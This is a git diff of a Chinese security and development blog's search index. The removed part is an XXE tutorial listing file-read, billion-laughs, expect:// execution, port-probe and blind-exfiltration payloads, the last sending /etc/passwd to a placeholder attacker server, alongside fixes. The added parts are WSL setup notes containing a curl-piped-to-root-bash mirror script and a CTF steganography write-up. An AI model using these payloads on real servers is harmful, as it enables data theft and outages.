-<p><strong>信息泄露：</strong> 攻击者可以利用XXE漏洞访问服务器上的敏感文件，如配置文件、数据库凭据等，从而获取敏感信息。</p>
-</li>
-<li>
-<p><strong>服务器端请求伪造（SSRF）：</strong> 攻击者可以利用XXE漏洞发起对内部网络的请求，可能导致服务器端请求伪造漏洞，从而进一步探测或攻击内部系统。</p>
-</li>
-<li>
-<p><strong>拒绝服务（DoS）：</strong> 攻击者可以通过恶意构造的XML文件引发大量资源消耗，导致服务器性能下降或完全不可用，造成拒绝服务。</p>
-</li>
-<li>
-<p><strong>远程代码执行（RCE）：</strong> 在某些情况下，XXE漏洞可能被利用以执行远程代码，导致服务器受到攻击者控制。</p>
-</li>
-<li>
-<p><strong>横向移动：</strong> 通过利用XXE漏洞，攻击者可能获取对服务器上其他应用程序或系统的访问权限，从而实现横向移动并扩大攻击范围。</p>
-</li>
-</ol>
-<h3 id="XML的定义">XML的定义</h3>
-<p>​	<strong>可扩展标记语言</strong>（E<strong>x</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage，简称：XML）是一种用于标记电子文件结构和数据的语言。它是一种通用的标记语言，旨在传输和存储数据，尤其适用于Internet环境。XML的设计目标是使数据具有自描述性和可扩展性。</p>
-<p>​	XML由一系列标签组成，每个标签用于标识数据的不同部分或属性。这些标签可以按照层次结构进行嵌套，从而创建复杂的数据结构。与HTML不同，XML没有预定义的标签集合，因此用户可以根据需要定义自己的标签。XML还允许用户定义数据类型、实体和命名空间，以增强数据的表现力和灵活性。</p>
-<p>​	XML的主要应用包括数据交换、配置文件、Web服务通信、数据存储等领域。它被广泛用于各种场景中，如Web开发、企业应用集成、文档标记等。 XML的易读性和灵活性使其成为一种流行的数据格式，受到广泛应用和支持。</p>
-<h3 id="XML的特点">XML的特点</h3>
-<ul>
-<li>XML 是一种很像 HTML 的标记语言，其设计宗旨是传输数据，而不是显示数据。</li>
-<li>XML 标签没有被预定义，需要自行定义标签。</li>
-<li>XML 被设计为具有自我描述性。</li>
-<li>XML 是 W3C 的推荐标准。</li>
-</ul>
-<h3 id="判断是否存在XXE漏洞">判断是否存在XXE漏洞</h3>
-<ol>
-<li>
-<p>检测XML是否会被解析</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">#测试1</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [<span class="meta">&lt;!ENTITY <span class="keyword">shit</span> <span class="string">&quot;this is shit&quot;</span>&gt;</span>]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;shit;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">#测试2</span><br><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">hacker</span> <span class="string">&quot;ESHLkangi&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>Dnslog方法-检测服务器是否支持外部实体（高匿）</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">shit</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://8108b8fa5c.ipv6.1433.eu.org.&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%shit; </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>如果上面两步都支持，那么就看能否回显。如果能回显，就可以直接使用外部实体的方式进行攻击。当然有时候服务器会不支持一般实体的引用。这样的话，只能使用Blind XXE（DNSlog）攻击。</p>
-</li>
-</ol>
-<h3 id="XXE的Payload">XXE的Payload</h3>
-<ol>
-<li>
-<p>文件包含</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>XXE炸弹：DOS攻击</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>XXE-命令执行（需要一些配置开启才能执行，很小概率能用）</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">		<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>端口扫描</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:8080“&gt;]&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;root&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;/root&gt;</span></span></span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>通过DTO读取文件（Blind XXE）</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attack.com/1.dto“&gt;]&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;root&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;/root&gt;</span></span></span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>DTO的内容</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY xxe SYSTEM &#x27;http://ATTACKESERVER.com/?%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
-<p>在attack的服务器WEB日志当中可以查看内容</p>
-</li>
-</ol>
-<h3 id="XML漏洞修复方法">XML漏洞修复方法</h3>
-<ol>
-<li>使用开发语言提供的禁用外部实体的方法</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newlnstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python:</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData=etree.parse(xmlSource,etree.XMLParser(resolve_entities=false))</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>
-<p>过滤用户提交的XML数据。过滤关键字：&lt;!DOCTYPE和&lt;/!ENTITY,或者SYSTEM和PUBLIC</p>
-</li>
-<li>
-<p>不允许XML中含有自己定义的DTD。</p>
-</li>
-</ol>
+    <title>WSL配置</title>
+    <url>//post/WSL/</url>
+    <content><![CDATA[<h3 id="启用Windows功能">启用Windows功能</h3>
+<p>按Windows键全局搜索“启用或关闭Windows功能”</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016221806427.png"
+                        alt="image-20241016221806427"
+                 ></p>
+<p>打开后开启图中的四个选项，有些系统可能会没有翻译成中文，记得仔细对照<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016222114609.png"
+                        alt="image-20241016222114609"
+                 ></p>
+<p>然后根据要求重新启动Windows系统</p>
+<h3 id="安装WSL">安装WSL</h3>
+<p>在Windows下按 Win 键，点击Windows PowerShell（管理员），在终端输入：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--install</span> <span class="literal">--no-distribution</span></span><br></pre></td></tr></table></figure>
+<p>完成上述命令后，系统会自动安装不带任何发行版的Linux虚拟机</p>
+<p>如果想查看已安装的发行版以及相应的WSL版本，可以输入：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--list</span> <span class="literal">--verbose</span></span><br></pre></td></tr></table></figure>
+<p>安装Ubuntu</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--install</span> Ubuntu<span class="literal">-22</span>.<span class="number">04</span></span><br></pre></td></tr></table></figure>
+<h4 id="也可以选择微软商店安装">也可以选择微软商店安装</h4>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016222658902.png"
+                        alt="image-20241016222658902"
+                 ></p>
+<p>然后就可以快乐的输入用户名和密码使用WSL了，<strong>注意用户名不可以有大写字母</strong></p>
+<h3 id="换源">换源</h3>
+<p>切换到root用户 <strong>(必须)</strong> ，用以下脚本一把梭</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line">bash &lt;(curl -sSL https://linuxmirrors.cn/main.sh)</span><br></pre></td></tr></table></figure>
+<h3 id="报错解决">报错解决</h3>
+<h4 id="一、内核更新">一、内核更新</h4>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">WslRegisterDistribution failed with error: 0x800701bc</span><br></pre></td></tr></table></figure>
+<p>以上报错需要下载安装适用于 x64 计算机的最新 WSL2 Linux 内核更新包</p>
+<p>安装链接：<a class="link"   href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi" >https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="二、回退到无网络">二、回退到无网络</h4>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Users\67300\.wslconfig</span><br><span class="line">Error code: Wsl/Service/CreateInstance/CreateVm/ConfigureNetworking/HNS/E_ACCESSDENIED</span><br><span class="line"></span><br><span class="line">Error message is in norwegian but transelate to &quot;can not configure network (networkingMode Nat) you can disable networking in .wslconfig&quot;</span><br></pre></td></tr></table></figure>
+<p>在C盘用户目录下创建一个<code>.wslconfig</code>文件，输入以下内容</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[wsl2]</span><br><span class="line">networkingMode=mirrored</span><br></pre></td></tr></table></figure>
+<p>然后Powershell输入即可</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--shutdown</span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>CTF</category>
+        <category>开发</category>
       </categories>
       <tags>
-        <tag>Web</tag>
+        <tag>环境配置</tag>
       </tags>
   </entry>
   <entry>
@@ -4976,43 +4976,6 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
       </tags>
   </entry>
   <entry>
-    <title>广域通信网</title>
-    <url>//post/rkwg3/</url>
-    <content><![CDATA[<h3 id="广域通信网物理层特性">广域通信网物理层特性</h3>
-<h4 id="公共交换电话网-PSTN">公共交换电话网 PSTN</h4>
-<p>PSTN是为了<strong>语音通信</strong>而建立的网络，20世纪60年代开始用于<strong>数据传输</strong></p>
-<p>电话网的3个组成部分：<strong>本地回路、干线、交换机</strong></p>
-<p>通过调制解调器，发送端 数字信号 -&gt; 模拟信号，接收端 模拟信号 -&gt; 数字信号</p>
-<p><strong>本地回路：</strong></p>
-<ul>
-<li>DTE <strong>数据终端设备</strong>，代币哎通信链路的端点（PC/电话机）</li>
-<li>DCE <strong>数据电路设备</strong>，用于信号变换器，自动呼叫等（猫/调制解调器/Modem）</li>
-</ul>
-<p>机械特性：RS-232-C建议使用25帧的D型连接器，微型机串行接口上大多使用9针连接器</p>
-<p>电气特性：RS-232-C采用V.28标准电路，速率20KB/s，最长15m，信号源产生3-15V的信号，±3V是信号电平过渡区，3-15V代表1，-3-15V代表2</p>
-<h3 id="流量与差错控制">流量与差错控制</h3>
-<h4 id="流量控制：X-25-TCP">流量控制：X.25 TCP</h4>
-<p>协调发送站和接收站工作步调，避免发送速度过快，接收站处理不过来</p>
-<p><strong>停等协议</strong>：工作站发一帧，收到应答信号后再发送下一帧，接收站每收到一帧后回送一个应答信号（ACK），表示愿意接收下一帧，如果接收站不应答，发送站必须等待</p>
-<p><strong>滑动窗口协议：允许连续发送多个帧而无需等待应答</strong></p>
-<p>假设站A和B通过全双工链路，B维持能容纳8个帧的缓冲区，这样A就可以连续发送8个帧而不必等待应答信号。</p>
-<h4 id="差错控制：CRC检错，海明码纠错">差错控制：CRC检错，海明码纠错</h4>
-<p>检测和纠错传输错误的机制</p>
-<p><strong>停等ARQ协议</strong>是停等流控技术和自动请求重发技术的结合</p>
-<ul>
-<li>发送站发出最后一帧后必须等待应答信号，<strong>收到肯定应答信号ACK后继续发送下一帧</strong>；收到否定应答信号NAK后重发该帧；若在一定的时间内没有收到应答信号也必须重发</li>
-<li></li>
-</ul>
-<h3 id="帧中继和HDLC">帧中继和HDLC</h3>
-]]></content>
-      <categories>
-        <category>网工</category>
-      </categories>
-      <tags>
-        <tag>软考中级</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>数据通信基础</title>
     <url>//post/rkwg2/</url>
     <content><![CDATA[<h3 id="信道特性">信道特性</h3>
@@ -5556,6 +5519,43 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
 </ul>
 <h4 id="海明码编码">海明码编码</h4>
 <h3 id="CRC循环冗余码">CRC循环冗余码</h3>
+]]></content>
+      <categories>
+        <category>网工</category>
+      </categories>
+      <tags>
+        <tag>软考中级</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>广域通信网</title>
+    <url>//post/rkwg3/</url>
+    <content><![CDATA[<h3 id="广域通信网物理层特性">广域通信网物理层特性</h3>
+<h4 id="公共交换电话网-PSTN">公共交换电话网 PSTN</h4>
+<p>PSTN是为了<strong>语音通信</strong>而建立的网络，20世纪60年代开始用于<strong>数据传输</strong></p>
+<p>电话网的3个组成部分：<strong>本地回路、干线、交换机</strong></p>
+<p>通过调制解调器，发送端 数字信号 -&gt; 模拟信号，接收端 模拟信号 -&gt; 数字信号</p>
+<p><strong>本地回路：</strong></p>
+<ul>
+<li>DTE <strong>数据终端设备</strong>，代币哎通信链路的端点（PC/电话机）</li>
+<li>DCE <strong>数据电路设备</strong>，用于信号变换器，自动呼叫等（猫/调制解调器/Modem）</li>
+</ul>
+<p>机械特性：RS-232-C建议使用25帧的D型连接器，微型机串行接口上大多使用9针连接器</p>
+<p>电气特性：RS-232-C采用V.28标准电路，速率20KB/s，最长15m，信号源产生3-15V的信号，±3V是信号电平过渡区，3-15V代表1，-3-15V代表2</p>
+<h3 id="流量与差错控制">流量与差错控制</h3>
+<h4 id="流量控制：X-25-TCP">流量控制：X.25 TCP</h4>
+<p>协调发送站和接收站工作步调，避免发送速度过快，接收站处理不过来</p>
+<p><strong>停等协议</strong>：工作站发一帧，收到应答信号后再发送下一帧，接收站每收到一帧后回送一个应答信号（ACK），表示愿意接收下一帧，如果接收站不应答，发送站必须等待</p>
+<p><strong>滑动窗口协议：允许连续发送多个帧而无需等待应答</strong></p>
+<p>假设站A和B通过全双工链路，B维持能容纳8个帧的缓冲区，这样A就可以连续发送8个帧而不必等待应答信号。</p>
+<h4 id="差错控制：CRC检错，海明码纠错">差错控制：CRC检错，海明码纠错</h4>
+<p>检测和纠错传输错误的机制</p>
+<p><strong>停等ARQ协议</strong>是停等流控技术和自动请求重发技术的结合</p>
+<ul>
+<li>发送站发出最后一帧后必须等待应答信号，<strong>收到肯定应答信号ACK后继续发送下一帧</strong>；收到否定应答信号NAK后重发该帧；若在一定的时间内没有收到应答信号也必须重发</li>
+<li></li>
+</ul>
+<h3 id="帧中继和HDLC">帧中继和HDLC</h3>
 ]]></content>
       <categories>
         <category>网工</category>
@@ -6115,6 +6115,233 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
 </tr>
 </tbody>
 </table>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024羊城杯 Misc方向部分WP</title>
+    <url>//post/ycb2024wp/</url>
+    <content><![CDATA[<h3 id="hiden">hiden</h3>
+<p>题目附件给了下面这两个文件</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb1.png"
+                        alt="ycb1"
+                 ></p>
+<p>txt文件的内容如下</p>
+<blockquote>
+<p>GK4368 ;?:C</p>
+<p>;G8F 34C2WVDJ?E]8&lt;8V[ V6@VX ?7 Di</p>
+<p>​    8&lt;80B?8? l D]6C?BWX</p>
+<p>​    DGJC0JC2 l JC2W8&lt;80B?8?X</p>
+<p>​    8&lt;80B?8? l DGJC0JC2]830@=8C7Wb[ @=8C36BC6 l VJG88JCVX Z 8&lt;80B?8?</p>
+<p>;G8F ;?:C]34C2WQ8C78];?:Q[ Q6@QX ?7 Di</p>
+<p>​    ?886G@ l D]EC84?6?K7WX</p>
+<p>​    ;?:0B?8? l @=8C?66?=W D]6C?BD6?KC7W`X X</p>
+<p>D36 G2BC&lt; G2 6?2ECWJC2W8&lt;80B?8?XXi</p>
+<p>​    ;?:0B?8?,G2BC&lt; Y c. l 8&lt;80B?8?,G2BC&lt;.</p>
+<p>​</p>
+<p>;G8F ;?:C]34C2WQFGBC2];?:Q[ Q;@QX ?7 Di</p>
+<p>​    D]7C84?6?K7W?886G@X</p>
+<p>​    D];6G8CD6?KC7W;?:0B?8?X</p>
+</blockquote>
+<p>根据名称猜测是rot47+rot13，解密可以得到下面的东西，目测python脚本</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb2.png"
+                        alt="ycb2"
+                 ></p>
+<p>然后再来一次rot13解密，即可得到下面这个加密脚本</p>
+<p>对照上面这个加密脚本，写一个脚本提取flag即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> wave.<span class="built_in">open</span>(<span class="string">&quot;hiden.wav&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    wav_data = <span class="built_in">bytearray</span>(f.readframes(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">file_len = <span class="built_in">int</span>.from_bytes(wav_data[<span class="number">0</span>:<span class="number">3</span>*<span class="number">4</span>:<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">extracted_data = <span class="built_in">bytes</span>([wav_data[i*<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">3</span> + file_len)])</span><br><span class="line"><span class="built_in">print</span>(extracted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ok，now you find me,so the flag give you</span></span><br><span class="line"><span class="comment"># DASCTF&#123;12jkl-456m78-90n1234&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="checkin">checkin</h3>
+<p>题目附件给了一个压缩包，里面有一个Flag.txt</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb3.png"
+                        alt="ycb3"
+                 ></p>
+<p>压缩包注释里的字符串base58解码后得到:Welcome2GZ</p>
+<p>然后Flag.txt把多余的\x00字符删掉可以得到一个pacpng流量包文件，里面主要是SMB流量</p>
+<p>写了一个python脚本来统计每行\x00字符的数量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict = &#123;</span><br><span class="line">    &quot;11&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;12&quot;: &quot;2&quot;,</span><br><span class="line">    &quot;13&quot;: &quot;3&quot;,</span><br><span class="line">    &quot;14&quot;: &quot;4&quot;,</span><br><span class="line">    &quot;15&quot;: &quot;5&quot;,</span><br><span class="line">    &quot;16&quot;: &quot;6&quot;,</span><br><span class="line">    &quot;17&quot;: &quot;7&quot;,</span><br><span class="line">    &quot;18&quot;: &quot;8&quot;,</span><br><span class="line">    &quot;19&quot;: &quot;9&quot;,</span><br><span class="line">    &quot;20&quot;: &quot;A&quot;,</span><br><span class="line">    &quot;21&quot;: &quot;B&quot;,</span><br><span class="line">    &quot;22&quot;: &quot;C&quot;,</span><br><span class="line">    &quot;23&quot;: &quot;D&quot;,</span><br><span class="line">    &quot;24&quot;: &quot;E&quot;,</span><br><span class="line">    &quot;25&quot;: &quot;F&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def calc():</span><br><span class="line">    with open(&quot;Flag.txt&quot;, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    res = []</span><br><span class="line">    for line in data[:4785]:</span><br><span class="line">        cnt = 0</span><br><span class="line">        for item in line:</span><br><span class="line">            if item == 0:</span><br><span class="line">                cnt += 1</span><br><span class="line">        res.append(cnt)</span><br><span class="line">    for item in res:</span><br><span class="line">        # print(dict[str(item)], end=&quot;&quot;)</span><br><span class="line">        print(item, end=&#x27; &#x27;)</span><br><span class="line">    # print(len(res))</span><br><span class="line">    # print(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve():</span><br><span class="line">    with open(&quot;Flag.txt&quot;, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read().replace(b&#x27;\x00&#x27;, b&#x27; &#x27;)</span><br><span class="line">    with open(&quot;hex.txt&quot;, &quot;wb&quot;) as f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    calc()</span><br><span class="line">    # solve()</span><br></pre></td></tr></table></figure>
+<p>（wbstego隐写，待复现）</p>
+<h3 id="1z-misc">1z_misc</h3>
+<p>附件下载下来后有一个天机不可泄露.txt</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb4.png"
+                        alt="ycb4"
+                 ></p>
+<p>根据网上找到的信息，女可以是坐标(1,1)和坐标(11,24)位置，觜可以是(9,1)和(7,25)位置，根据 是以十二岁 可知十二时辰，每个时辰末尾对应的星宿为坐标开始的字<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb5.png"
+                        alt="ycb5"
+                 ></p>
+<p>获得如下列表</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb6.png"
+                        alt="ycb6"
+                 ></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">心胃心奎奎心奎心胃心心心胃心心胃心奎奎奎奎胃奎心奎奎胃奎心奎心奎奎</span><br></pre></td></tr></table></figure>
+<p>然后只有三个字，猜测是摩斯电码，解得解压密码 E@SI1Y!</p>
+<p>解压后得到一个flag文件和一个hint.jpg</p>
+<p>hint文件中提示了天琴座，天琴座的英文是 lyra</p>
+<p>联想到前不久2024ISCC考察的一道题目，主要用到了这个开源项目 <a class="link"   href="https://github.com/google/lyra" >https://github.com/google/lyra<i class="fas fa-external-link-alt"></i></a></p>
+<p>因此按照Github上的步骤安装一下lyra，这个项目需要使用 bazel 进行安装，所以安装lyra之前需要先安装bazel</p>
